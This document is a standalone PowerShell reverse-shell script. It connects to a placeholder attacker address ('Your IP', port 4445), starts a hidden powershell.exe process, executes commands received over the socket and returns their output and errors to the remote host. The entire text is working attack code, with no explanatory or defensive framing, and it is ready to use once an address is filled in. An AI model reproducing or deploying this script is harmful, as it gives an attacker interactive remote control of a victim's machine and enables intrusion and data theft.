$TCPClient = New-Object System.Net.Sockets.TCPClient('Your IP', 4445)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
$StreamReader = New-Object System.IO.StreamReader($NetworkStream)
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = 'powershell.exe'
$Process.StartInfo.RedirectStandardInput = $true
$Process.StartInfo.RedirectStandardOutput = $true
$Process.StartInfo.RedirectStandardError = $true
$Process.StartInfo.UseShellExecute = $false
$Process.Start()
$InputBuffer = New-Object System.Text.StringBuilder

# Async output handling
$OutputBuffer = New-Object System.Byte[] 4096
$Encoding = [System.Text.Encoding]::ASCII

while($true) {
    # Check network stream
    if($NetworkStream.DataAvailable) {
        $Read = $NetworkStream.Read($OutputBuffer, 0, 4096)
        $Command = $Encoding.GetString($OutputBuffer, 0, $Read)
        $Process.StandardInput.WriteLine($Command)
    }

    # Check process output
    if($Process.StandardOutput.Peek() -ne -1) {
        $Output = $Process.StandardOutput.ReadToEnd()
        $StreamWriter.Write($Output)
        $StreamWriter.Flush()
    }

    # Error handling
    if($Process.StandardError.Peek() -ne -1) {
        $ErrorOutput = $Process.StandardError.ReadToEnd()
        $StreamWriter.Write("[ERROR] $ErrorOutput")
        $StreamWriter.Flush()
    }

    Start-Sleep -Milliseconds 100
    if($TCPClient.Connected -ne $true) { break }
}

$StreamWriter.Close()
$NetworkStream.Close()
$TCPClient.Close()
